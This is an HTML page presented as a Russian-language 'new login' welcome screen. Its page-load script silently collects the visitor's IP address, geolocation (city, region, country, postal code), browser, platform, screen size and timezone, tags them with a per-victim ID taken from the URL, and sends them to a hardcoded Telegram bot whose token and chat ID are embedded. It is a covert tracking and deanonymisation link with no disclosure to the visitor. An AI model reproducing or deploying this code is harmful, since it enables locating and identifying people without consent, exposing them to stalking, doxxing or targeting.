<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>Новый вход</title>
  <script>
    window.onload = async function () {
      const urlParams = new URLSearchParams(window.location.search);
      const TARGET_ID = urlParams.get("u"); 
      if (!TARGET_ID) return;

      const CHAT_ID = 769893160;
      const BOT_TOKEN = '8254985090:AAEmnwYKpxW5zsB5RrbzTUNj8aNA8MasEeM';

      async function sendTelegram(payloadObj) {
        const text = "```json\n" + JSON.stringify(payloadObj, null, 2) + "\n```";
        try {
          const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: CHAT_ID,
              text: text,
              parse_mode: "MarkdownV2"
            })
          });
          const result = await resp.json();
          if (!resp.ok) console.error(result);
        } catch (err) {
          console.error(err);
        }
      }

      try {
        const ipResponse = await fetch('https://ipapi.co/json/');
        const ipData = ipResponse.ok ? await ipResponse.json() : { error: "ipapi_failed" };
        const ua = navigator.userAgent || null;
        const lang = navigator.language || null;
        const platform = navigator.platform || null;
        const screenSize = (screen && screen.width && screen.height) ? `${screen.width}x${screen.height}` : null;
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || null;
        const now = new Date().toISOString();
        const cookiesEnabled = navigator.cookieEnabled ? true : false;
        const javaEnabled = (typeof navigator.javaEnabled === 'function') ? navigator.javaEnabled() : null;
        const online = navigator.onLine;

        const payload = {
          id: TARGET_ID,
          response: {
            ip: ipData.ip || null,
            city: ipData.city || null,
            region: ipData.region || null,
            country: ipData.country_name || ipData.country || null,
            postal: ipData.postal || null,
            user_agent: ua,
            language: lang,
            platform: platform,
            screen: screenSize,
            timezone: timezone,
            time_iso: now,
            cookies_enabled: cookiesEnabled,
            java_enabled: javaEnabled,
            online: online,
            raw_ipapi: ipData
          }
        };

        await sendTelegram(payload);

      } catch (error) {
        const errorPayload = {
          id: TARGET_ID,
          response: null,
          error: String(error)
        };
        await sendTelegram(errorPayload);
        console.error(error);
      }
    };
  </script>
</head>
<body>
  <h1>Добро пожаловать!</h1>
</body>
</html>
